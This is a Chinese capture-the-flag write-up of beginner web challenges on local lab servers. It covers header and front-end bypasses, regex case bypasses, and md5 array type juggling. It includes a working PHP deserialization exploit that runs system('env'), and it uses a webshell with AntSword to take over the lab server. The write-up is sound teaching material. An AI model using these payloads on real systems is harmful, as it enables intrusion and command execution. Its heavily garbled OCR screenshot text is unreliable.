ZH-CN,ZH;Q-0.8,ZH-TW;Q-0.7,2H-HR:Q.5,EN-US;Q-0.3,EN;D-0.2 6ACCEPT-ENCODING:GZIP,DEFLATE,BR 2.尝试下载一个别的什么玩意来使用 15 请求头 7 CONNECTION:CLOSE SCOOKIE:VERITY-ADMIN 这题,我们还是学习HTTP UPGRADE-INSECURE-REQUESTS:1 10 SEC-FETCH-DEST: DOCWNENT 11 SEC-FETCH-HODE: NAVIGATE 那么,我们来试一下同时把下面要求完成吧! 12 SEC-FETCH-SITE; NONE 13 SEC-FETCH-USER: 71 14PRIORITY:U-D,I 15 CONTENT-TYPE:APPLICATION/X-VVVV-FORM-URLENCODED 请用GET方法传入一个A参数 16 COR CONTENT-LENGTH:2 再用POST方法传入一个6参数 你需要使用ADMIN的身份验证 恭喜你已经基本学惊了HIP的最最基础知识,先去下一关吧 FLAG3:YX3ROMXN 前往下一关 0高亮 搜索 完成 1,028字节371MILLIS 内存:226.0MB ALL ISSUES(11) -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1723289760376-e7d35694-f9b0-43d3-a85b-55007fc1a123.png)

第四部分同样使用到了 ez_php 中的 referer http参数

<!-- 这是一张图片，ocr 内容为：查看 BURP项目 帮助 重放器 BURP SUITE专业版 V2024.2.1 - LICENSED TO LEON406 INTRUDER 编码工具 日志 目标 扩展学习学习COLLABORATOR 对比工具 重放器 代理 ORGANIZER 仪表盘 INTRUDER SEQUENCER 代理设置 WEBSOCKET历史记录 HTTP历史记录 拦截 请求HTTP://127.0.0.1:55474 丢弃 操作 放行 打开内嵌浏览器 拦截已开启 美化 HEX RAW HTTP/1.1 GET/ /FLAG4BBC.PHP H HOST:127.0.0.1:55474 I UGER-AGERT:  HO3ILLA/5.D (VINDOVS NT 10.Q; DING!; X64; EV:129.D) GECKO/20100101 FLRETOX/129. ILACCEPL-LANGUAGE: ZH-CN,2H;QE0.8,ZH-TWIQ.7,2H-HKIQE0.5,EN-USIQF0.3,ENIQE0.2 ACCEPT-ENCODING: GZIP, DEFLATE, BR CONNECTION:CLOSE 8 COOKIE:VERIFY USER UPGRADE-INSECURE-REQUESTS:I 10 SEC-FETCH-DEST: DOCUMENT 11 SEC-FETCH-MODE: NAVIGATE 12 SE SEC-FETCH-SITE:NONE 13 SE SEC-FETCH-USER:21 14PRIORITY:U-0,I 15 REFERER: HTTP://LOCALHOST:8080/FLAG3CAD.PHP?A-1 16 -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1723290487102-727a41ae-1971-4a93-8172-116ab7b01d90.png)

由于该页面没有 9 选项（也可以用控制台输入9），那么只能分析他的源码部分，根据源码部分发现其 为你过关时，其会进行 POST flag4bbc.php 页面的操作，并发送 method=get ，那么我们也以 POST 请求，即可拿到 flag5

<!-- 这是一张图片，ocr 内容为：OK,你成功闯入了第四关! 本关考验你听声辩位的功夫,你需要按下开始按钮后,根据提示按下相应的按钮. 开始9 12845678 无障碍环境 G器 应用程序 调试器 日存储 网络 性能 HACKBAR 下内存 查看器 控制台 MAX HACKBAR 大钢 搜索 团 FLAG4BBC.PHPX 来源 主线程 12700155474 FLAG4BBC.PHP VAR BUTTONS - DOCUMENT.GETELEMENTBYID("SCOPE").GETELEMENTSBYTAGNAME("BUT E("BUTTON"); FOR (VAR I-0; I < BUTTONS.LENGTH; I+)( I+1J BUTTONS[I].ID FUNCTION START() DOCUMENT.GETELEMENTBYID("NUM").INNERTEXT - "9"; FUNCTION GETID(BUTTON) IF(BUTTON.ID 9) ALERT("你过关!(铜人震声)\N我们使用 CONSOLE.LOG 来为你生成 FLAG"); FETCH('FLAG4BBC.PHP', METHOD:'POST', BODY:METHODGET'. HEADERS:{ 'CONTENT-TYPE': 'APPLICATION/X-WWW-FORM-URLENCODED', 3).THEN(DATA) RETURN UATA. JSON 3).THEN((RESULT)> CONSOLE.LOG(RESULT.HINT); CONSOLE.LOG(RESULT.F11); CONSOLE.LOG(RESULT.GOTO) 35 }ELSEF ALERT("该罚!(头部碰撞声)") -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1723290435834-da29cf18-64de-4add-8e13-548cffcc21f3.png)

<!-- 这是一张图片，ocr 内容为：项目 BURP SUITE专业版 V2024.2.1 - 临时项目-LICENSED TO LEON406 查看 帮助 重放器 BURP INTRUDER 日志ORGANIZER O接素 扩展学习学习COLLABORATOR 对比工具 编码工具 目标 代理 重放器 SEQUENCER 仪表盘 3X 4 X 十 5X HTTP/1 目标:HTTP://127.0.1:56834 三人 发送 取消 X海云三 INSPECTOR 请求 响应 5           IN  三 2 请求属性 V RAW HEX 美化 页面渲染 美化 HEX RAW POST/FLAG4BBE.PHP HTTP/1.1 1 HTTP/1.1 200 OK HOST:127.0.0.1:56834 SERVER:NGINX/1.18.0 请求查询参数 3D 3USER-AGENT: HOZILLA/5.O (VINDOWS NT 10.0; WLN64; X64; RV:129.0) DATE:SAT,10 AUG 2024 11:50:24 GHT 40 GECKO/20100101 FIREFOX/129.0 CONTENT-TYPE:APPLICATION/3SON 请求主体参数 5CO CONNECTION:CLOSE ACCEPT: 6X-1 X-POVERED-BY:PHP/7.3.22 TEXT/HTML,APPLICATION/XHTMI+XML,APDLICATION/XML:QFD.9,IMAGE/AVLT,IMAGE/WE CONTENT-LENATH:215 BP,IMAGRE/PNG,IMAGE/SVG+XML,*/*;Q*0.8 请求COOKIES ACCEPT-LANGUAGE: 9 2H-CH,GH;Q-0.G,2H-TW;QW0.7,ZH-BK;Q-0.5,EN-US:Q-0.3,EN;Q-0,2  HINT  : 6 ACCEPT-ENCODING: GZIP, DEFLATE, BR 请求头 7 REFERER:HTTP://127.0.0.1:56834/FLAG4BBC.PHP W\U60ED\U559C\U4TE0\UZF01/44F60\USD+2\U7ECF(U77E5(U9053(UGFOC\U524D\U7A ER\U7684\U4E00/U5207\U90TA\U662T\U53ER\UGEES(U66TA/U6539\17684\UTTOL", 8CONNECTION:CLOSE 值 名称 9  COOKIE:VERIFY USER "FLL":"ELAG":EDFVUMHJ", WGOTOL":"\U524D\U5F80\UFFLA\/FLAG5SXR.PHP" 10 UPGRADE-INSECURE-REQUESTS: 1 127.0.0.1:56834 HOST 11SEC-FETCH-DEST:DOCUNENT 12SEC-FETCH-HODE: NAVIGATE MOZILLA/5.0 (WI... USER-AGENT 13 SEC-FETCH-SITE:SAME-ORIGIN ACCEPT TEXT/HTML.APPLI..... 14SEC-FETCH-USER:71 15 PRIORITY:U O, ACCEPT-LANGUA... ZH-CN,ZHYQ0..... 16 RETERER: HTTP://LOCALHOST:8080/FLAG3CAD.PHP?A-1 17 CONTENT-TYPE: APPLICATION/X-VVV-TORM-URLENCODED ACCEPT-ENCODI... QZIP.DEFLATE,BR 18 100 CONTENT-LENGTH:10 HTTP://127.0.0..... REFERER METHOD-GRET CONNECTION CLOSE VERLFYUSER COOKIE UPGRADE-INSEC... 1 SEC-FETCH-DEST DOCUMENT SEC-FETCH-MODE NAVIGATE SEC-FETCH-SITE TESAME-ORIGIN SEC-FETCH-USER ?1 PRIORITY U-0.I HTTP://LOCALHOS.... REFERER 资 CONTENT-TYPE APPLICATION/X..... 0高亮 个 搜索 0高亮 搜索 完成 391字节|366 ALL ISSUES (32) EVENT LOG (7) 内存:282.9MB -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1723290657836-9990768f-8fc0-474b-b7e0-e6823cd8b2d0.png)

在第五个flag 页面中，输入 I want flag 并不能得到 flag，分析他的源代码，发现其插入了一段 js

<!-- 这是一张图片，ocr 内容为：恭喜你们已经获得了四颗龙珠,还有一半就集齐了! 想必你已经知道,前端不靠谱了 现在,我们来加深一下印象: 请输入"I WANT FLAG":I WANT FIAG 提交 日存储 0.内存 样式编辑器 无障碍环境 竹网络 查看器 应用程序 口调试器 性能 HACKBAR 控制台 MAX HACKBAR 搜素 大纲 FLAG5SXR.PHP X 来源 园 <HEAD> 主线程 234 <TITLE>FLAG5(/TITLE> 127.0.0.1:5474 <META CHARSET."UTF-8"> FLAG5SXR.PHP </HEAD> <BODY> <P>恭喜你们已经获得了四颗龙珠,还有一半就集齐了!</P> <P>想必你已经知道,前绪不军谱了</P> 9 <P>现在,我们来加深一下印象:</P> 10 <FORM NAME:"FORM" ACTION:"FLAGSSXR.PHP" ONSUBMITS"RETURN CHECKVALUE(" METHODE"POST" 11 请输入 "I WANT FLAG" :<INPUT TYPE-"TEXT" NAME-"CONTENT"><BR> 12 <INPUT TYPE-"SUBMIT" VALUE-"提交"> 13 14 </FORM> </BODY> <SCRIPT> FUNCTION CHECKVALUE() VAR CONTENT - DOCUMENT.FORMS["FORM"]["CONTENT"].VALUE; IF (CONTENT MM "I WANT FLAG"){ ALERT("你就这么直接?"); RETURN FALSE: ELSEF RETURN TRUE ; </SCRIPT> -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1723290917379-98cd4201-76ab-4567-875b-4a15d76cb731.png)

当我们提交的适合，会触发这个 js，那我们不去触发这个 js，而是根据源码中的信息进行 post 发送，content=I want flag ，即可拿到 flag5 

<!-- 这是一张图片，ocr 内容为：拦截 WEBSOCKET历史记录 HTTP历史记录 请求HTTP://127.0.0.1:55474 操作 丢弃 放行 拦截已开启 打开内嵌浏览器 美化 RAW HEX POST/FLAG5SXR.PHP HTTP/1.1 NOSL:147.0,0,1155474 IDGER-AGENT: HO3LLA/5.0 (NINDOVS UT 10.0; W4NE4; X69; X69; EV:129:0) GEEKO/2D10D10D1 PITETOX/129.0 456789 LACCEPL-LANGUAGE;   ZH,ZHIQ:3,2H-TH-TW;QMO.7,2H一班K;QR0,5,EN-USIQFO:3,ENIQ.3 ACCEPT-ENCODING:GZIP, DEFLATE, BR CONNECTION: CLOSE COOKIE:VERIFY-USER UPGRADE-INSECURE-REQUESTS: 1 10 SEC SEC-FETCH-DEST:DOCUMENT 11 SEC-FETCH-MODE: NAVIGATE 12SEC-FETCH-SITE:NONE 13 SEC-FETCH-USER: ?1 PRIORITY:U-0,I CONTENT-TYPE:APPLICATION/X-WWW-FORM-URLENCODED 16 CONTENT-LENGTH:0 CONTENTI VANT FLAG X FLAG5 127.0.0.1:55474/FLAG5SXRPHP 恭喜你们已经获得了四颗龙珠,还有一半就集齐了! 想必你已经知道,前端不靠谱了 现在,我们来加深一下印象: 请输入"L WANT FLAG":I WANT FLAG 提交 恭喜,我相信你已经深刻了解了前端不可信任的道理! FLAG5:FSV90ADF 前往下一关 -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1723291077435-9b14e4dd-c6fb-4432-a716-7e6eff2ae02d.png)

第6部分是一个基础的代码审计

<!-- 这是一张图片，ocr 内容为：恭喜你已经突破了前端的限制,可以来看一个经典的后端语言:PHP 不难哦,只要能看懂就行了 <?PHP HIGHLIGHT_FILE(*FLAG6DIW.PHP"): && $_POST['MOE']) (ISSET($ GET[MOE IF IF  (PREG_MATCH("/FLAG/", $_GET['MOE'])) DIE( NO ): ELSEIF (PREG_MATCH('/FLAG/I', $_GET['MOE'])  { ECHO  "FLAG6: XXXX -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1723291132386-2e346c3b-f8eb-40da-85b9-0dbc09c64d46.png)

第一个 if 匹配 GET moe 参数 和 POST moe 参数是否传参，后面两个 if 分别为两个 正则匹配，两者区别为 第一个 /flag/ 另一个 /flag/i，多了一个修饰符，即不区分大小写

那么不处发第一个而触发第二个使用的方法为 大小写 绕过，发送Flag即可， 只要包含大写，则它不会被 flag 匹配，第二个因为不区分大小写则会被匹配到

<!-- 这是一张图片，ocr 内容为：BURP SUITE专业版 V2024.2.1 - LICENSED TO LEON406 帮助 重放器查看 项目 BURP INTRUDER 日志  ORGANIZER  学习 COLLABORATORATOR 对比工具 编码工具 目标 重放器 代理 仪表盘 INTRUDER SEQUENCER 代理设置 HTTP历史记录 拦截 WEBSOCKET历史记录 请求HTTP://127.0.1:55474 拦截已开启 丢弃 操作 打开内嵌浏览器 放行 美化 HEX RAW INSP HTTP/1.1 POST/FLAG6DIW.PHP ?MOE-FLAG HOST:127.0.0.1:55474 请求 (WINDOWS NT 10.0; WIN64; X64; RV:129.0) GECKO/20100101 FIREFOX/129.0 USER-AGENT:HOZILLA/5.0 ILACCEPT-LANGUAGE: ZH-CN,ZHIQ.8,ZH-TH-TH;QE0.7,ZH-HRIQ:5,EN-US;QF0.3,ENIQ. 请求 ACCEPT-ENCODING: GZIP, DEFLATE, BR REFERER:HTTP://127.0.0.1:55474/FLAG5SXR.PHP 请求 CONNECTION: CLOSE COOKIE:VERIFY USER UPGRADE-INSECURE-REQUESTS: 请求 SECFETCH-DEST:DOCUMENT SEC-FETCHODE:NAVIGATE SEC-FETCH-SITE: SAME-ORIGIN 请求 SEC-FETCH-USER:?1 15PRIORITY:U 名称 16 CONTENT-TYPE: APPLICATION/X-WWW-FORM-URLENCODED 17 CONTENT-LENGTH: 0 HOS 18 19 MOE 1 USER -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1723291591149-aad74f50-9a07-4522-abcd-622e16025c74.png)

<!-- 这是一张图片，ocr 内容为：恭喜你已经突破了前端的限制,可以来看一个经典的后端语言:PHP 不难哦,只要能看懂就行了 <?PHP HIGHLIGHT_FILE("FLAG6DIW.PHP"); IF (ISSET($ GET[ MOE'] &&$ POST[MOE (/FLAG/", $_GET['MOE']) IF() (PREG_MATCH( DIE('NO"): (PREG_MATCH('FLAG/I',  $_GET['MOE'])  { L ELSEIF ECHO  "FLAG6: XXX FLAG6:RZV9VX2T 前往下一关 -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1723291601907-4da7956a-3820-40ec-9e60-5264fc85b406.png)

第七个部分，其为一个 webshell ，那么我们使用任何的webshell 工具都可以执行，或者使用 POST 传参可以执行任意 php 代码，比如我 POST 传参 what=system('ls');，即执行系统命令 ls ，可以查看到目录下的所有文件

<!-- 这是一张图片，ocr 内容为：恭喜你已经来到了最后一颗龙珠前. 但是,由于龙珠披你抢走了6个,现在这个弗拉格之地的空间已经极度不稳定,要前场了,最后一颗地珠也不知道滚落到了那里 下面已经出现了空间裂痕,借助他的力量找到这片空间里的最后一颗龙珠? 日存储 0内存 应用程序 卡无障碍环境 HACKBAR O调试器 +网路 MAX HACKBAR 样式编份器 合看器 门控制台 O OTHER XSS* XXE ENCODING SQL* ENCRYPTION LOAD URL HTTP://127.0.1:55474/TIAG7FINAL.PHP SPLIT URL EXECUTE POST DATA O REFER O USER AGENT O KIES CLEAR ALL ADD T WHATSYSTEM(IS'; -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1723291705241-4d691a8a-d4e5-4396-ba0d-6c0ac59f85a6.png)

为了方便，我们推荐使用 webshell 工具进行连接，直接接管服务器，推荐：蚁剑

<!-- 这是一张图片，ocr 内容为：中国蚁剑 ANTSWORD编辑窗口调试 品 设置 数据管理(41) 分类目录(1) 添加 URL 地址 A重命名 删除 IP地 添加数据 口默认分类 HTTP://NODE4.ANNA-SSCT  CN:2866:1.14. 41 测式连接 添加 X清空 HTTP://192.168.91 192. 与基础配置 HTTP://192.168.91 192.1 HTTP://192.168.91 HTTP://127.0.0.1:55474/FLAG7FXXKFINAL.PHP URL地址 192.1 M HTTP://192.168.91 192.1 连接密码 WHAT 1.14. HTTP://NODE4.ANNA CR 网站备注 HTTP://NODE4.ANNA 1.14. 编码设置 UTF8 HTTP://NODE4.ANN 04.14. CR 连接类型 PHP HTTP://NODE4.ANN 51.14.14. N 编码器 HTTP://NODE5.ANN. 118.1 DEFAULT(不推荐) HTTP://NODE5.ANN 118.1 BASE64 HTTP://110.40.35 110.4 CHR HTTP://NODE5.AN 118.1 .CN 1.14. HTTP://NODE4.AN .CN 请求信息 HTTP://NODE5.AN 118.1 .CN 其他设置 HTTP://NODE4.AN .CN 1.14. 四川省成都市 2024/06/28  21:31:02 11.14.71.254 .CN 2024/06/28  21:30:21 HTTP://NODE4.AN SL 四川省成都市 2024/06/28  21:19:41 1.14.71.254 2024/06/28  21:00:35 HTTP://NODE4.ANNA CN: 四川省成都市 2024/06/28  20:18:50 (1.14.71.254 HTTP://NODE4.ANNA.I 2024/06/28  20:18:50 CN: -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1723291808794-a834c4ca-2976-4bab-894b-a687702db602.png)

在服务器的根目录中拿到 flag7

<!-- 这是一张图片，ocr 内容为：中国蚁剑 ANTSWORD编辑窗口调试 口127.0.0.1 文件列表(19) 目录列表(17) 书签 上层 C刷新 新建 主目录 读取 VAR 属性 大小 名称 日期 BIN 360 B 0755 DEV 2024-08-10 11:21:48 DEV 4 KB 0755 2024-08-10 11:21:48 ETC ETC 4 KB 0755 2020-06-11 18:51:59 HOME HOME 2020-09-22  08:25:33 4 KB 0755 LIB LIB 4 KB 0755 2020-05-29 14:20:33 MEDIA MEDIA 0755 4 KB MNT 2020-05-29 14:20:33 MNT OPT 0755 4 KB 2020-05-29 14:20:33 OPT PROC 0B 0555 2024-08-10 11:21:48 PROC ROOT 0700 4 KB 2020-09-03  22:05:19 ROOT RUN 0755 2024-08-10 11:21:48 4 KB RUN SBIN 2020-09-22  08:25:33 4 KB 0755 SBIN SRV 4 KB 2020-05-29 14:20:33 0755 SRV SYS 0B 0555 2024-08-10 11:21:48 SYS TMP 4KB 1777 2024-07-03 10:29:01 TMP USR 4 KB 2020-09-22  08:27 0755 USR 4 KB 2020-09-22 08:26:27 0755 VAR 14B 2024-08-10 04:52:33 FLAG7 0644 2024-08-10 04:52:33 363 B 0644 HINT.TXT 三任务列表 HTTP://NODE5.AN 118.1 -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1723291832196-ba796d8e-c201-4a4c-8aff-3d441dc71f44.png)

<!-- 这是一张图片，ocr 内容为：中国蚁剑 ANTSWORD编辑窗口调试 口127.0.0.1 编辑:/FLAG7  X  中用此编码打开 三高亮 刷新 保存 /FLAG7 RBM93X1DLON0 02/  克  A/P -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1723291840171-9dec6c94-a4fa-4534-b157-ac7868779df8.png)

最后拼接所有的 flag，base64解码得到flag

### pop_moe
这是一个 反序列化 题目，需要一定的基础，建议查看一些相关资料再尝试

以下为构造的链子，如果不会的话可以直接询问学长

```plain
// class000::__destruct --> class000::check --> class001::__incoke --> class002::__set --> class002::dangerous --> class003::evvval --> class003::mystr
```

构造的exp

```plain
<?php
class class003 {
    public $mystr = "?><?php system('env'); ?>";
}

class class002 {
    private $sec;
    public function __construct()
    {
        $this->sec = new class003();
    }
}

class class001 {
    public $payl0ad;
    public $a;
}

class class000 {
    private $payl0ad = 1;
    public $what;
}

$a = new class002();

$b = new class001();
$b -> a = $a;
$b -> payl0ad = "dangerous";

$c = new class000();
$c -> what = $b;

echo urlencode(serialize($c));
?>
```

# WEEK 2
## WEB
### 静态网页
肯定隐藏在js中，尝试直接全局搜索

<!-- 这是一张图片，ocr 内容为：感源代码 </>元索 口应用程序 内存 SXRHHH的个人小站 00 FROMTS X G 蛋盖 内容脚本 片段 口 工作区 1F604.SVG KATEX.MIN.CSS 18 4 <A HREF+"HTEPS://DEVELOPER,MOZELLA.ORG/EN-US/GOCS/GOCS/IAVASCRIOT/REFERENCE/TERATIONLDONLDL * CBJECT INTO AN OBSERVABLE THAT ENITS THE ITENS IN THAT PRONLSE, AFRAY, OR ITERABLE. A S 127.0.0.159091 欢迎来到SXRHH的个人小站 LOSEB 在接出未接放的异常时管停 口DST 在推出制的异朵时台停 STYLESHECT 这里是SXRHH的个人小站.这次博客成功迁移成功,但是我还没有想好怎么做主 4 CONVERTS AN ARRAY TO AN OBSERVABLE 卖引 1 B7E1B6AA-AF79-460-854F-3BEFF9818600 页.那就先这样吧. CDNJSDELIVE.NET INPORT ( FROM ) FRON 'RXJS' 门用维修 来看看我的网站能做什么吧 CONST ARREY : [18, 28, 30]; FONTS.GOOGLEAPIS.COM 未超停 CONST RESULT - FRON(ARRAY); XHR/提取断点 回首往期文章 RESULT.SUBSCRIBE(X 2) CONSOLE.LOG(X)); DOM新点 11LOGS 全局侦听证 查看我的文章,回首成长之路. 事件领所器断点 十博客 显示更多 配豆 此想本在调试程序的忽略列表中 从忽略列表中则除 CSP注反了规定断点 (LUNDLEDLGTAMING-不适用 抓住关键同 十 出田 问题 控制台 换卖 在众多关键词中,找到你想要的,查看它.  GETFED-1-53--127.00.1590G1/APILGEV7ID 1-53 一网站词云 105 "EAGT: PLEASE TUM TO FINAL CHALLENGEPHP' -INDEXS-12700.159091/ASSETS/ASSEITEMPLATES/SRCITES/ASSETS/ASSETS/INDEXTS 30 "FEELURE 这是做什么的 32  EOPORT TYPE 来到关于界面,查看作者搭建网站背后的故事 127&PARAM 127 @PARAM FLAG - 六关于本站 1316 132. CONTIG LEATURES INCLUDES( BX -12700.159D9L/ASSETS/SVASCR/SRC/TEMPLATES/ASCR/SAARDT/INDEXTSX 36 CONST ENUM 49 " @PARAM FISG -RENDER 54 DHAUMANP SOARCHITEM SIN EE -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1723900083826-b2aa8f0a-9856-4d22-b778-2760da4e9fc1.png)

切入 final1l1l_challenge.php 页面

<!-- 这是一张图片，ocr 内容为：<?PHP HIGHLIGHT_FILE('FINALLLL_CHALLENGE.PHP'); ERROR_REPORTING(0); INCLUDE  'FLAG.PHP' $A二$ $_GET[ _POST['B'] $B三 &&& ISSET($B)) ISSET($A) (!IS_NUMERIC($A) &&  LIS_NUMERIC($B)) MD5($A) $B($A]) ( IF &&LE $FLAG: ECHO ELSE ('NOOOOOOOOOOOO'); DIEL L ELSE  DIE( 'NOTICE  THE PARAM TYPE!'): ELSE WHERE DIE( YOUT PARAM? -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1723900120362-f6d8f52b-0762-4a7a-ba7f-a72e9301428a.png)

分析逻辑为：需要GET传入a以及POST传参b，同时要求 a 和 b 都不为数字，且 a 为 0，b[a] 时为 md5(a)，只需要构造 b 为字典，a为任意不为数字的值即可

```plain
需要构造 a='a' 和 b['a'] = md5('a')
即：
  GET ?a=a
  POST b[a]=0cc175b9c0f1b6a831c399e269772661
```

<!-- 这是一张图片，ocr 内容为：<?PHP HIGHLIGHT_FILE("FINALLLL_CHALLENGE.PHP'); ERROR_REPORTING(0); INCLUDE  'FLAG PHP' $A - $_GET[A']: _POST[B'] $B三 ISSET((() $A) && IF ISSET (!IS_NUMERIC($A) &&  !IS_NUMERIC($B))  { IF MD5($A) $B($AL) ( 0&& $FLAG: ECHO ELSE NOOOOOOOOO0000 DIE ELSE 'NOTICE THE PARAM TYPE!'); DIE( E1SE DIE( WHERE PARAM? S YOUR MOECTFLIS-MY WIFE-PIO.CHAN 性能心内存目存储 个网络 司 无障碍环境 应用程序 调试器 刀样式编辑器 口查看器 控制台 ENCRYPTION LFI ENCODING SQL XXE XSS OTHER LOADURL HTTP://127.0.0.1:56096/FINAL1L CHALLENGE.PHP?A-A SPLIT URL EXECUTE USER AGENT COOKIES CLEAR ALL REFERER POST DATA ADD"I B[A]-0CC175B9C0F1B6A831C399E269772661 -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1723900473804-8c8b7ef4-54d1-4868-9616-8e47518e1a23.png)



